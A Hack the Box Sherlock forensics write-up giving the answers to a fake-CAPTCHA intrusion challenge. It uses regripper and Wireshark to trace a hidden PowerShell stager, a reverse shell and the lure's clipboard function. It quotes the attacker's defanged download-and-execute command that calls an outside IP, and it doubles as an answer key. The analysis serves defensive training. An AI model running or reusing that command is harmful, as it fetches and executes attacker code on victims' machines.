# Pikaptcha

Hack the Box Link: [Pikaptcha](https://app.hackthebox.com/sherlocks/Pikaptcha)

1. It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
* *Answer*: powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http[:]//43[.]205[.]115[.]44/office2024install[.]ps1')"
* Use regripper within the linux command line and auto detect with ```regripper -f NTUSER.DAT -a```. 
2. At what time in UTC did the malicious payload execute?
* *Answer*: 2024-09-23 05:07:45
* From the output of ```regripper -f NTUSER.DAT -a``` the Last Write time is the last run time of the
3. The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?
* *Answer*: 579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de
* Export the object using wireshark since you know it is over HTTP. Run ```sha256sum``` to get the answer. 
4. To which port did the reverse shell connect?
* *Answer*: 6969
* Look at the pcap and identify the network traffic with destination 43[.]205[.]115[.]44
5. For how many seconds was the reverse shell connection established between C2 and the victim's workstation?
* *Answer*: 403
* Look at the difference in time between the intial SYN and the FIN PSH ACK flags
6. Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?
* *Answer*: stageClipboard
* Look at the wireshark data, filter based on the malicious IP from 1 with a focus on the HTTP traffic. The GET requests have the website code. 